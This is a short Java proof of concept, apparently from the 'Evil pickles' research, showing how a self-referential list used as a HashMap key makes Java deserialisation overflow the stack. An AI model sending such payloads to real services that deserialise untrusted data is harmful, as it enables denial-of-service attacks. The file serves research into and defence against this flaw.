package nz.ac.vuw.jenz.evilpickles;

import com.google.common.collect.Ordering;

import java.io.*;
import java.util.*;

/**
 * TurtlesAllTheWayDown payload showing how deserialisation of a grafted payload can lead to stackoverflow errors.
 * See Dietrich, Jens, Kamil Jezek, Shawn Rasheed, Amjed Tahir, and Alex Potanin. "Evil pickles: DoS attacks based on object-graph engineering." ECOOP'172017.
 * @author jens dietrich
 */
public class TurtlesAllTheWayDown {

    public static void main (String[] args) throws Exception {
        Serializable payload = constructPayload(50);
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(bout);
        oout.writeObject(payload);
        System.out.println("TurtlesAllTheWayDown serialised");

        ByteArrayInputStream bin = new ByteArrayInputStream(bout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bin);
        oin.readObject();
        System.out.println("TurtlesAllTheWayDown de-serialised");
    }

    static Serializable constructPayload (int depth)  {
        HashMap map = new HashMap();
        List list = new ArrayList();
        map.put(list ,"");
        list.add(list);
        return map;
    }
}
